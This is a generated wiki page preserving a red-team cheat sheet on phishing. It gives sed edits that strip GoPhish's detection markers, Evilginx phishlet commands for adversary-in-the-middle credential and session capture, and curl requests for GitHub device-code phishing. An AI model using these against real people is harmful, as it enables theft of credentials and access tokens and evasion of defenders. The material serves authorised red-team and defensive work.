---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Phishing

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-access-phishing` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/phishing.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Phishing](../../topics/redteam/phishing.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-access-phishing |
| name | Phishing |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/access/phishing.md |

## Preserved Source Material

````yaml
_body: "# Phishing\n\n> Phishing is a cybersecurity attack where malicious actors impersonate legitimate organizations (like\
  \ banks, social media platforms, or email providers) to trick people into revealing sensitive information such as passwords,\
  \ credit card numbers, or personal data.\n\n## Opsec Fails\n\n* **Reusing IPs/Domains**: Using the same IP address or domain\
  \ across multiple campaigns or malware families.\n* **No Domain Privacy**: WHOIS records exposing registrant info (name,\
  \ email, phone).\n* **Same Registrant Email**: Reusing the same email address across domains.\n* **Unrotated SSL Certificates**:\
  \ Self-signed or identical certificates reused across phishing sites.\n\n## GoPhish\n\n* [gophish/gophish](https://github.com/gophish/gophish)\
  \ - Open-Source Phishing Toolkit\n* [kgretzky/gophish/](https://github.com/kgretzky/gophish/) - Gophish integration with\
  \ Evilginx 3.3\n* [puzzlepeaches/sneaky_gophish](https://github.com/puzzlepeaches/sneaky_gophish) - Hiding GoPhish from\
  \ the boys in blue\n\n```ps1\ngit clone https://github.com/gophish/gophish.git\ngo build\n```\n\n### IOC\n\n* `X-Gophish-Contact`\
  \ and `X-Gophish-Signature`\n\n    ```ps1\n    find . -type f -exec sed -i.bak 's/X-Gophish-Contact/X-Contact/g' {} +\n\
  \    sed -i 's/X-Gophish-Contact/X-Contact/g' models/email_request_test.go\n    sed -i 's/X-Gophish-Contact/X-Contact/g'\
  \ models/maillog.go\n    sed -i 's/X-Gophish-Contact/X-Contact/g' models/maillog_test.go\n    sed -i 's/X-Gophish-Contact/X-Contact/g'\
  \ models/email_request.go\n\n    find . -type f -exec sed -i.bak 's/X-Gophish-Signature/X-Signature/g' {} +\n    sed -i\
  \ 's/X-Gophish-Signature/X-Signature/g' webhook/webhook.go\n    ```\n\n* Default server name\n\n    ```ps1\n    sed -i 's/const\
  \ ServerName = \"gophish\"/const ServerName = \"IGNORE\"/' config/config.go\n    ```\n\n* Default `rid` parameter\n\n  \
  \  ```ps1\n    sed -i 's/const RecipientParameter = \"rid\"/const RecipientParameter = \"keyname\"/g' models/campaign.go\n\
  \    ```\n\n## Evilginx\n\n* [kgretzky/evilginx2](https://github.com/kgretzky/evilginx2) - Standalone man-in-the-middle\
  \ attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication\n\
  * [evilginxpro](https://evilginx.com/) - The phishing framework for red teams\n\n```ps1\n# List Available Phishlets\nphishlets\n\
  \n# Enable a Phishlet\nphishlets enable <phishlet_name>\n\n# Disable a Phishlet\nphishlets disable <phishlet_name>\n```\n\
  \n## Device Code Phishing\n\n* Github\n\n    ```ps1\n    curl -X POST https://github.com/login/device/code \\\n    -H \"\
  Accept: application/json\" \\\n    -d \"client_id=01ab8ac9400c4e429b23&scope=user+repo+workflow\"\n\n    curl -X POST https://github.com/login/oauth/access_token\
  \ \\\n    -H \"Accept: application/json\" \\\n    -d \"client_id=01ab8ac9400c4e429b23&device_code=be9<code_from_earlier>&&grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Adevice_code\"\
  \ -k | jq\n    ```\n\n## References\n\n* [A Smooth Sea Never Made a Skilled Phisherman - Kuba Gretzky - 8 july 2024](https://youtu.be/Nh99d3YnpI4)\n\
  * [Introducing: GitHub Device Code Phishing - John Stawinski, Mason Davis, Matt Jackoski - June 12, 2025](https://www.praetorian.com/blog/introducing-github-device-code-phishing/)\n\
  * [Never had a bad day phishing. How to set up GoPhish to evade security controls - Nicholas Anastasi - Jun 30, 2021](https://www.sprocketsecurity.com/blog/never-had-a-bad-day-phishing-how-to-set-up-gophish-to-evade-security-controls)\n\
  * [Unraveling and Countering Adversary-in-the-Middle Phishing Attacks - Pawel Partyka - 8 july 2024](https://youtu.be/-W-LxcbUxI4)"
_relative_path: redteam/access/phishing.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/phishing.md
````
